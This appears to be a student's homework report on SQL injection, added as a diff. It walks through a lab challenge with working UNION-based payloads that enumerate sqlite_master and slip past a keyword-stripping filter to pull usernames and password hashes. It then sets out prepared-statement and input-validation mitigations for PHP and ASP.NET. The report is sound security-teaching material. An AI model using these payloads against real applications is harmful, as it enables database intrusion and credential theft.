@@ -1,0 +1,215 @@
+Megh Vakharia
+SQLi HW - Report
+
+Description
+==========================================================
+SQL injection is an attack that exploits SQL data by 
+injecting malicious SQL queries or malicious SQL values into
+the application, executing the attacker's code against the
+application's database. SQL injection is bad because it can
+lead to data leaks, malicious data manipulation, or even
+loss of application data. SQL injections are primarily executed
+when HTTP request parameters contain values which will be 
+inserted into SQL queries.
+
+
+Test Steps
+==========================================================
+Challenge 12
+=============
+(1) Start by entering an expected query into the input box:
+
+1984
+
+Note that three items are returned - 1984 (book title), George Orwell (author),
+and Secker and Warburg (presumably the publisher).
+
+(2) Now let's try breaking the query - put the following text into the input
+box: 
+
+1984'
+
+You'll notice that you get a regular SQL injection error that shows the entire query:
+SELECT title, author, publisher, published FROM books WHERE title='1984''
+Note that there are 4 columns being selected from, through "published" is hidden in the
+output. This is good - now we know how many inputs to UNION on!
+
+(3) Let's try breaking out of the query and adding another SELECT statement via a UNION.
+Type the following into the input box:
+
+1984' union select null, null, null, null --
+
+You should notice that a new row is returned with "None" values for everything. This
+confirms that we can UNION on another SELECT statement's results as long as there are 
+4 columns! 
+
+(4) The description of the puzzle says that the users table is renamed, which can be confirmed with the following query:
+
+1984' union select null, null, null, null from users --
+
+The error: "no such table: users" is returned.
+Luckily, sqlite has table called "sqlite_master" which lists all
+of tables and schemas within the database. Let's try pulling from that table:
+
+1984' union select null, null, null, null from sqlite_master —
+
+Given that we get a valid "None" row back, we've confirmed that the table exists.
+
+(5) If you Google the schema for sqlite_master, you can see the the schema includes:
+
+type TEXT,
+name TEXT,
+tbl_name TEXT,
+rootpage INTEGER,
+sql TEXT
+
+Now that we know the column names, we can pull the real "users" tablename into our results,
+though we should keep in mind that the fourth column's values are hidden:
+
+1984' union select type, name, tbl_name, null from sqlite_master --
+
+The returned rows show two tables: one called "books", which we already know about, and another called "othersupersecretuserstable".
+
+(6) Let's try pulling from the othersupersecretuserstable table:
+
+1984' union select null, null, null, null from othersupersecretuserstable --
+
+That doesn't work! However, if we see the error output, we can see that the table name has
+been stripped out, presumably by the serverside code processing the query:
+
+Query: SELECT title, author, publisher, published FROM books WHERE title='1984' union select null, null, null, null from --'
+
+(7) Let's try a few other variations, such as comments:
+
+1984' union select null, null, null, null from /*o*/thersupersecretuserstable --
+
+Different characters:
+
+1984' union select null, null, null, null from PSothersupersecretuserstable --
+
+We'll note that both times, the value "othersupersecretuserstable" is stripped out of the query. However,
+if we place characters in between "othersupersecretuserstable", the table name isn't stripped out:
+
+1984' union select null, null, null, null from oPSPSPSPSthersupersecretuserstable --
+
+returns: 
+
+Query: SELECT title, author, publisher, published FROM books WHERE title='1984' union select null, null, null, null from oPSPSPSPSthersupersecretuserstable --'
+
+This is useful - now we know that only the fullword "othersupersecretuserstable" is stripped out.
+
+(8) Let's try putting the tablename within itself othersupersecretusers/*othersupersecretuserstable*/table. 
+The assumption is that the commented out othersupersecretuserstable will be stripped out, leaving
+the outer othersupersecretuserstable, and hopefully executing the statement correctly.
+
+1984' union select null, null, null, null from othersupersecretusers/*othersupersecretuserstable*/table --
+
+And... it works! Now we can try it with column names which we think could exist
+in the users table:
+
+username
+password
+email
+id
+
+1984' union select id, username, password, null from othersupersecretusers/*othersupersecretuserstable*/table --
+
+Success! That works - we are now able to see the username and password hash.
+
+
+Mitigations
+==========================================================
+PHP
+====
+Use PDO (PHP Data Objects) or MySQL prepared statements to ensure
+request values aren't automatically placed into SQL queries,
+rather filtering them into a prepared statement. This is easy to 
+set up - just setup a mysqli prepared statement, bind parameters
+to the statement, and execute the statement with the desired parameter
+values. This will ensure that SQL queries aren't executed with 
+values that could expand the SQL statement maliciously, rather sandboxing 
+the value within the prepared variable(s).
+
+Code Example:
+<?php
+$mysqli = new mysqli("example.com", "user", "password", "database");
+if ($mysqli->connect_errno) {
+    echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
+}
+
+/* Prepared statement, stage 1: prepare */
+if (!($stmt = $mysqli->prepare("INSERT INTO test(id) VALUES (?)"))) {
+     echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
+}
+
+/* Prepared statement, stage 2: bind and execute */
+$id = 1;
+if (!$stmt->bind_param("i", $id)) {
+    echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
+}
+
+if (!$stmt->execute()) {
+    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
+}
+?>
+
+ASP.NET
+========
+In ASP.NET, there're a few ways to protect from SQL injection attacks, but the
+main steps are to constrain input by way of validators and use parameters with
+procedures / dynamic SQL. 
+
+Constraining input allows you to ensure the input
+parameter matches what you expect - you can do this using Regex or Range validators:
+using System;
+using System.Text.RegularExpressions;
+
+public void CreateNewUserAccount(string name, string password)
+{
+    // Check name contains only lower case or upper case letters, 
+    // the apostrophe, a dot, or white space. Also check it is 
+    // between 1 and 40 characters long
+    if ( !Regex.IsMatch(userIDTxt.Text, @"^[a-zA-Z'./s]{1,40}$"))
+      throw new FormatException("Invalid name format");
+
+    // Check password contains at least one digit, one lower case 
+    // letter, one uppercase letter, and is between 8 and 10 
+    // characters long
+    if ( !Regex.IsMatch(passwordTxt.Text, 
+                      @"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$" ))
+      throw new FormatException("Invalid password format");
+
+    // Perform data access logic (using type safe parameters)
+    ...
+
+Furthermore, you can use parameters with procedures / dynamic SQL to ensure
+values are sandboxed rather than executed outside of where they're expected:
+using System.Data;
+using System.Data.SqlClient;
+
+using (SqlConnection connection = new SqlConnection(connectionString))
+{
+  DataSet userDataset = new DataSet();
+  SqlDataAdapter myDataAdapter = new SqlDataAdapter(
+         "SELECT au_lname, au_fname FROM Authors WHERE au_id = @au_id", 
+         connection);                
+  myCommand.SelectCommand.Parameters.Add("@au_id", SqlDbType.VarChar, 11);
+  myCommand.SelectCommand.Parameters["@au_id"].Value = SSN.Text;
+  myDataAdapter.Fill(userDataset);
+}
+
+By doing this, you will be able to ensure that 1) the data being inputted
+looks how you expect it to and 2) parameters are sandboxed appropriately.
+
+
+Further Reading
+==========================================================
+PHP Prepared Statements: http://php.net/manual/en/mysqli.quickstart.prepared-statements.php
+PHP SQL Injection Breakdown: http://php.net/manual/en/security.database.sql-injection.php
+How To: Protect From SQL Injection in ASP.NET: https://msdn.microsoft.com/en-us/library/ff648339.aspx
+
+Resources Used for Challenges
+==========================================================
+Used this to figure out how to get sqlite table names:
+http://stackoverflow.com/questions/82875/how-to-list-the-tables-in-an-sqlite-database-file-that-was-opened-with-attach
+Challenge 9 helped by: https://websec.files.wordpress.com/2010/11/sqli2.pdf (using different character cases)
